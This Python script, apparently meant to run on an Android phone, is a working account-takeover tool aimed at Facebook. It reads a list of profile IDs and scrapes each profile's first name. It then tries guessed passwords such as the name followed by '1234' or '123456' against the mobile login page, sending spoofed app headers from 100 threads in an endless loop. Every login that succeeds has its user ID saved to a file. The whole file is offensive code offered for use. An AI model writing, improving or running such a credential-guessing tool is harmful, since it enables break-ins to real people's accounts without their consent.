import requests
from bs4 import BeautifulSoup
from concurrent.futures import ThreadPoolExecutor, as_completed
import threading

print_lock = threading.Lock()
file_lock = threading.Lock()

used_usernames = set()
try:
    with open("/storage/emulated/0/used_ids.txt", "r") as used_file:
        used_usernames = {line.strip() for line in used_file if line.strip()}
except FileNotFoundError:
    pass

def try_passwords(session, login_url, username, first_name, headers, payload_base):
    passwords = [f"{first_name}1234", f"{first_name}123", f"{first_name}123456", f"{first_name}123456789"]
    for password in passwords:
        payload = {**payload_base, "email": username, "pass": password, "login": "Log In"}
        response = session.post(login_url, headers=headers, data=payload)
        with open(f"/storage/emulated/0/status/{username}.html", "w", encoding="utf-8") as file:
            file.write(response.text)
        if "c_user" in session.cookies.get_dict():
            return True, session.cookies.get_dict().get("c_user")
    return False, None

def attempt_login(username):
    global first_name
    url = f"https://www.facebook.com/{username}"
    headers = {
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Referer": "https://m.facebook.com/reg",
        "Connection": "keep-alive",
        "X-FB-Connection-Type": "MOBILE.LTE",
        "X-FB-Connection-Quality": "EXCELLENT",
        "X-FB-Net-HNI": "51502",
        "X-FB-SIM-HNI": "51502",
        "X-FB-HTTP-Engine": "Liger",
        "x-fb-connection-type": "Unknown",
        "accept-encoding": "gzip, deflate",
        "content-type": "application/x-www-form-urlencoded",
        "x-fb-http-engine": "Liger",
        "User-Agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1903 Build/O11019; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/70.0.3538.110 Mobile Safari/537.36 [FBAN/EMA;FBLC/en_US;FBAV/444.0.0.0.110;]",
    }

    response = requests.get(url, headers=headers)
    with open("username.html", "w", encoding="utf-8") as file:
        file.write(response.text)

    if response.ok:
        soup = BeautifulSoup(response.text, "html.parser")
        title = soup.find("title")
        if title:
            page_title = title.get_text()
            if "Facebook" in page_title:
                return
            else:
                first_word = page_title.split("|")[0].split()[0]
                first_name = first_word[0].lower() + first_word[1:] if first_word else ""
        else:
            return
    else:
        return

    try:
        login_url = "https://m.facebook.com/login.php"
        session = requests.Session()
        response = session.get(login_url, headers=headers)

        soup = BeautifulSoup(response.text, "html.parser")
        lsd = soup.find("input", {"name": "lsd"})["value"]
        jazoest = soup.find("input", {"name": "jazoest"})["value"]
        payload_base = {"lsd": lsd, "jazoest": jazoest}
        success, user_id = try_passwords(session, login_url, username, first_name, headers, payload_base)

        if success:
            with print_lock:
                print(f"✅ Login successful! User ID: {user_id} ({username})")
            with file_lock:
                with open("/storage/emulated/0/success.txt", "a") as file:
                    file.write(f"{user_id}:{username}\n")
        else:
            with print_lock:
                print(f"❌ Login failed for {username}")

    except Exception as e:
        with print_lock:
            print(f"⚠️ Error for {username}: {e}")

    with file_lock:
        with open("/storage/emulated/0/used_ids.txt", "a") as used_file:
            used_file.write(f"{username}\n")

if __name__ == "__main__":
    max_workers = 100
    with open("/storage/emulated/0/facebook_profile_id.txt", "r") as f:
        usernames = [line.strip() for line in f if line.strip() and line.strip() not in used_usernames]

    # with file_lock:
    #     with open("used_profile_id.txt", "a") as used_file:
    #         for username in usernames:
    #             used_file.write(f"{username}\n")

    while True:
        try:
            with ThreadPoolExecutor(max_workers=max_workers) as executor:
                futures = [executor.submit(attempt_login, username) for username in usernames]
                for future in as_completed(futures):
                    future.result()
        except:
            pass
